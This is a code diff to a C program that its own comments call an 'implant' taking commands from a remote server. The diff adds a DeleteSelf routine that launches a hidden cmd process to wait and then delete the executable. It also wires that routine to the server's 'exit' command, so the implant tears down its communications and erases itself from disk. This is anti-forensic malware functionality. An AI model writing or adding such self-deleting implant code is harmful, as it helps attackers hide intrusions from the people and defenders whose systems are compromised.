@@ -345,6 +345,32 @@ end:
 }
 
 
+// Ends the process and deletes the binary
+void DeleteSelf() {
+    char path[MAX_PATH];
+    char command[50 + MAX_PATH];
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    // Get path to executable
+    GetModuleFileName(NULL, path, MAX_PATH);
+
+    // Command to execute (wait for 3 seconds to give time for parent to exit, then delete binary)
+    sprintf(command, "cmd /C timeout 3 >nul && del \"%s\"", path);
+
+    // Process setup
+    ZeroMemory(&si, sizeof(si));
+    ZeroMemory(&pi, sizeof(pi));
+    si.cb = sizeof(si);
+
+    CreateProcessA(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    exit(0);
+}
+
+
 
 
 
@@ -392,7 +418,11 @@ int main() {
 
         // Main logic of implant
         // Note: to maintain synchronization between requests and responses, always need to send something back to server
+        
+        // To delete binary after exit, we spawn a new child process
         if (strncmp(buffer, "exit", 4) == 0) {
+            TearDownComms();
+            DeleteSelf();
             break;
         }
 
